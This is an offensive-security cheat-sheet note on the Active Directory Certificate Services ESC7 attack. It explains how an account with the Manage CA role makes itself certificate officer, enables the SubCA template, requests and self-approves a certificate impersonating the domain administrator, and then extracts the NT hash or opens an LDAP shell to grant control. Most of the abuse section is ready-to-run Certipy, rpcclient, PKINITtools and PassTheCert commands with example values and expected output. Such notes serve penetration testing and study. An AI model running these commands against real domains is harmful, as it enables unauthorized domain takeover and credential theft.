---
Primary_category: "ADCS - ESC7"
title: "[[ADCS]]"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[ADCS]]

#### *Theory*

This attack vector leverages excessive permissions on the *CA* object directly by abusing the combination of two specific security roles within the *CA*

 - ***Manage CA***

This permission grants an excessive control over the *CA* object. A principal assigned this role can perform the following actions →

***Modify the CA Configuration***

> ***e.g. Enable/Disable Templates, Set Policy Flags...***

***Assign CA Roles***

> ***Including Certificate Manager/Officer***

***Start/Stop the CA Service***

***Manage CA Security***

- ***Manage Certificates***

> ***Also known as Certificate Manager/Officer***

Any principal assigned this role can approve or deny pending certificate requests and revoke issued certificates

The main point of this attack vector is that if an operator compromises a domain account with the *Manage CA* role assigned to it, it can grant itself the *Manage Certificates* permission/security role, so it becomes a new *Certificate Manager/Officer* in the *CA*

Having both permissions *( Manage CA and Manage Certificates)*, an operator can enable a *Certificate Template* that allows *enrollee-supplied subjects* and has a very broad *Extended Key Usage ( EKU )* *( i.e. Including Client Authentication )*, such as the *SubCA* certificate template

Then, we can request a certificate for the given template by providing a *Certificate Signing Request ( CRS )* whose *Subject Alternative Name ( SAN )* contains the *UPN* of the principal we want to impersonate

Since, by default, this template does not allow any enrollment from non-privileged users, we will have to approve our own certificate request by leveraging the recently assigned *Manage Certificates* security Role

This process basically allows an attacker to obtain a valid certificate for any existing domain principal

---

#### *Enumeration*

##### *Certipy*

> ***[Certipy](https://github.com/ly4k/Certipy)***

###### *Setup*

```bash
mkdir Certipy
cd !$ && python3 -m venv .venv
. !$/bin/activate && pip3 install certipy-ad
```

###### *Usage*

```bash
certipy find -dc-ip '<DC_IP>' -username '<USER>' -password '<PASSWD>' -stdout -vulnerable
```

---

#### *Abuse*

##### *Workflow*

Let's suppose that we compromise a domain user account which has excessive permissions over the *CA* object directly

We use *certipy* to enumerate this permissions and we see that the user account has been assigned the *Manage CA* security role

From here, we can leverage the given security role to grant ourselves the *Manage Certificates* permission

The latter make us a *Certificate Manager/Officer*, therefore we can approve or deny any certificate request, as well as revoke existing ones

Then, we have to look for a *Certificate Template* that has a broad *EKU*, which includes *Client Authentication*, and allows *enrollee-supplied subjects*, so we can specifiy the *UPN* of the principal we want to impersonate within the *CSR's SAN attribute* ***( [[ADCS - ESC1|ESC1]] )***

To do so, we can leverage the *Sub CA* template, which is usually enabled by default. If not, since we have been assigned the *Manage CA* security role, we can enable it

Once we carry out the request submission, it will be denied but will generate a request ID

As mentioned, since we have the *Manage Certificates* security rol, we can approve our own certificate request and subsequently retrieve the certificate

To do so, we must save both the private key associated with the *CSR* and the *Request ID*


With the issued certificate, we can carry out several actions →

- ***PKINIT → [[PASS THE CERTIFICATE|Pass the Certificate]] → TGT → [[UNPAC THE HASH|Unpac the Hash]] → NT Hash***

- ***No PKINIT → [[PASS THE CERTIFICATE (SCHANNEL)|Schannel Pass the Certificate]] → LDAP Authentication***

##### *Requirements*

- ***Valid Domain Credentials***

- ***The controlled user account must be assigned the "Manage CA" Security Role***

> ***To enable Sub CA Template ( If disabled ) and grant ourselves Certificate Manager***

##### *UNIX-Like*

###### *Identifying ADCS in the domain*

- ***[Netexec](https://github.com/Pennyw0rth/NetExec)***

```bash
nxc ldap '<DC>' --username '<USER>' --password '<PASSWD' --module adcs
```

> [!DANGER]- *e.g.*
>
> ```bash
> nxc ldap 10.10.10.5 --username 'john.doe' --password 'password1234$!' --module adcs
> ```
>

###### *Looking for security flaws and misconfigurations in ADCS*

- ***[Certipy](https://github.com/ly4k/Certipy)***

***Setup***

```bash
mkdir Certipy
cd !$ && python3 -m venv .venv
. !$/bin/activate && pip3 install certipy-ad
```

***Usage***

> ***Certipy find***

```bash
certipy find -dc-ip '<DC_IP>' -username '<USER>' -password '<PASSWD>' -stdout -vulnerable
```

> [!DANGER]- *e.g.*
>
> ```bash
> certipy find -dc-ip '10.10.10.5' -username 'john.doe' -password 'password1234$!' -stdout -vulnerable
> ```
>
###### *Granting ourselves the Manage Certificate Permission ( If needed )*

> ***Becoming Certificate Manager/Officer***

> ***To approve any Certificate Request***

- ***Certipy***

> ***Certipy ca***

```bash
certipy ca -username '<USER>@<DOMAIN>' -password '<PASSWD>' -ns '<DC_IP>' -target '<TARGET_FQDN>' -ca '<CA_NAME>' -add-officer '<CONTROLLED_ACCOUNT>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> certipy ca -username 'john.doe@DOMAIN.INTERNAL' -password 'password1234$!' -ns '10.10.10.5' -target 'DC01.DOMAIN.INTERNAL' -ca 'DOMAIN-DC01-CA' -add-officer 'john.doe'
> ```
>

###### *Ensuring the SubCA Template is enabled on the CA ( if needed )*

- ***Certipy***

> ***Certipy ca***

```bash
certipy ca -username '<USER>@<DOMAIN>' -password '<PASSWD>' -ns '<DC_IP>' -target '<TARGET_FQDN>' -ca '<CA_NAME>' -enable-template 'SubCA'
```

> [!DANGER]- *e.g.*
>
> ```bash
> certipy ca -username 'john.doe@DOMAIN.INTERNAL' -password 'password1234$!' -ns '10.10.10.5' -target 'DC01.DOMAIN.INTERNAL' -ca 'DOMAIN-DC01-CA' -enable-template 'SubCA'
> ```
>

###### *Submitting a Certificate Request ( CSR ) using the SubCA Template*

> ***Expected to fail initially if no direct Enrollment Rights***

***Listing the Impersonated User's SID***

- ***[RPCclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)***

```bash
rpcclient --user '<DOMAIN>/<USER>%<PASSWD>' --command 'lookupnames <USER>' '<DC>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> rpcclient --user 'DOMAIN.INTERNAL/john.doe%password1234$!' --command 'lookupnames Administrator' 'DC01'
> ```
>

***Requesting the Certificate***

- ***Certipy***

> ***Certipy req***

```bash
certipy req -username '<USER>@<DOMAIN>' -password '<PASSWD>' -dc-ip '<DC_IP>' -target '<TARGET_FQDN>' -ca '<CA_NAME>' -template 'SubCA' -upn '<IMPERSONATED_USER>@<DOMAIN>' -sid '<IMPERSONATED_USER_SID>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> certipy req -username 'john.doe@DOMAIN.INTERNAL' -password 'password1234$!' -dc-ip '10.10.10.5' -target 'DC01.DOMAIN.INTERNAL' -ca 'DOMAIN-DC01-CA' -template 'SubCA' -upn 'administrator@DOMAIN.INTERNAL' -sid 'S-1-5-21-4078382237-1492182817-2568127209-500'
> ``` 
>

> [!TLDR]- *Expected Output*
>
> ```bash
> [*] Requesting certificate via RPC
> [*] Request ID is 22
> [-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
> Would you like to save the private key? (y/N): y
> [*] Saving private key to '22.key'
> [*] Wrote private key to '22.key'
> [-] Failed to request certificate
> ```
>

> [!IMPORTANT] *Important*
>
> Keep both the Request ID and the Private Key associated with the submitted CSR for further steps
>

###### *Approving the Pending Certificate Request*

> ***Manage Certificates Role comes into play***

- ***Certipy***

> ***Certipy ca***

```bash
certipy ca -username '<USER>@<DOMAIN>' -password '<PASSWD>' -ns '<DC_IP>' -target '<TARGET_FQDN>' -ca '<CA_NAME>' -issue-request '<REQUEST_ID>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> certipy ca -username 'john.doe@DOMAIN.INTERNAL' -password 'password1234$!' -ns '10.10.10.5' -target 'DC01.DOMAIN.INTERNAL' -ca 'DOMAIN-DC01-CA' -issue-request '22'
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> [*] Successfully issued certificate request ID 22
> ```
>

###### *Retrieving the Issued Certificate once approved*

> ***Certificate Retrieval using the Request ID and the Private Key saved in [[#Submitting a Certificate Request ( CSR ) using the SubCA Template|this]] step***

- ***Certipy***

> ***Certipy req***

```bash
certipy req -username '<USER>@<DOMAIN>' -password '<PASSWD>' -dc-ip '<DC_IP>' -target '<TARGET_FQDN>' -ca '<CA_NAME>' -retrieve '<REQUEST_ID>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> certipy req -username 'john.doe@DOMAIN.INTERNAL' -password 'password1234$!' -dc-ip '10.10.10.5' -target 'DC01.DOMAIN.INTERNAL' -ca 'DOMAIN-DC01-CA' -retrieve '22'
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> [*] Retrieving certificate with ID 22
> [*] Successfully retrieved certificate
> [*] Got certificate with UPN 'administrator@DOMAIN.INTERNAL'
> [*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
> [*] Loaded private key from '22.key'
> [*] Saving certificate and private key to 'administrator.pfx'
> [*] Wrote certificate and private key to 'administrator.pfx'
> ```
>

###### *#1 - PKINIT PtC + Unpac the Hash*

- ***Certipy***

```bash
certipy auth -dc-ip '<DC_IP>' -pfx '<PFX>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> certipy auth -dc-ip '10.10.10.5' -pfx administrator.pfx
> ```
>

- ***[PKINITtools](https://github.com/dirkjanm/PKINITtools)***

***Setup***

```bash
git clone 'https://github.com/dirkjanm/PKINITtools' PKINITtools
cd !$ && python3 -m venv .venv
. !$/bin/activate && pip3 install -r requirements.txt
```

***Usage***

> ***[[PASS THE CERTIFICATE|PtC]]***

```bash
python3 gettgtpkinit.py -dc-ip '<DC_IP>' -cert-pfx '<PFX>' '<DOMAIN>/<PRINCIPAL>' '<CCACHE_FILE>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> python3 gettgtpkinit.py -dc-ip '10.10.10.5' -cert-pfx administrator.pfx 'DOMAIN.INTERNAL/administrator' 'administrator.ccache'
> ```
>

> ***[[UNPAC THE HASH|UtH]]***

```bash
export KRB5CCNAME=$( realpath <CACHE_FILE> )
```

```bash
python3 getnthash.py -dc-ip '<DC_IP>' -key '<AS_REP_ENC_KEY>' '<DOMAIN>/<USER>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> python3 getnthash.py -dc-ip '10.10.10.5' -key '4a917980d21d1cdb32f83099fb0d119f4b5c75c20bf5d0f4f5441c1c88a290d2' 'DOMAIN.INTERNAL/administrator'
> ```
>

###### *#2 - Schannel PtC*

> ***See [[PASS THE CERTIFICATE (SCHANNEL)|PtC with Schannel]]***

If the *DC* in question does not support *PKINIT* due to the absence of the *Smart Card Logon Extended Key Usage ( EKU )* in its certificate, an operator could use the issued certificate to authenticate against *LDAPs* or *LDAP* with *STARTTLS*

Then, we could carry out specific actions depending on the privileges the principal in question has over the domain

For instance, if we leverage an *ESC1* vector to obtain an arbitraty certificate whose *SAN* corresponds to the identity of a privileged domain user, such as the administrator account, we could grant ourselves *FullControl* over the latter

- ***Certipy***

```bash
certipy auth -dc-ip '<DC_IP>' -pfx '<PFX>' -ldap-shell
```

> [!DANGER]- *e.g.*
>
> ```bash
> certipy auth -dc-ip '10.10.10.5' -pfx 'administrator.pfx' -ldap-shell
> ```
>

> ***Certipy's LDAP Shell***

```bash
> grant_control 'DC=<DOMAIN>,DC=<TLD>' '<TARGET_PRINCIPAL>' '<GRANTEE>' # i.e. A controlled domain account
```

> [!DANGER]- *e.g.*
>
> ```bash
> grant_control 'DC=DOMAIN,DC=INTERNAL' 'administrator' 'john.doe'
> ```

- ***[PassTheCert](https://github.com/AlmondOffSec/PassTheCert)***

***Setup***

> ***Downloading the script***

```bash
curl --silent --location --request GET --remote-name 'https://github.com/AlmondOffSec/PassTheCert/raw/refs/heads/main/Python/passthecert.py'
```

> ***Extracting both certificate and private key from the PFX***

```bash
certipy cert -pfx '<PFX>' -nokey -out '<OUTPUT_CERTIFICATE>'
certipy cert -pfx '<PFX>' -nocert -out '<OUTPUT_PRIVATE_KEY>'
# Or
openssl pkcs12 -in '<PFX>' -clcerts -nokeys -out '<OUTPUT_CERTIFICATE>'
openssl pkcs12 -in '<PFX>' -nocerts -out '<OUTPUT_PRIVATE_KEY>'
```

***Usage***

```bash
python3 passthecert.py -action 'ldap-shell' -domain '<DOMAIN>' -dc-host '<DC_FQDN>' -crt '<CERTIFICATE>' -key '<PRIVATE_KEY>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> python3 passthecert.py -action 'ldap-shell' -domain 'DOMAIN.INTERNAL' -dc-host 'DC01.DOMAIN.INTERNAL' -crt user.crt -key user.key
> ```
>

##### *Windows*

> 🛠️⌛

---

#### *Resources*

***[Certipy Wiki: ESC7](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca)***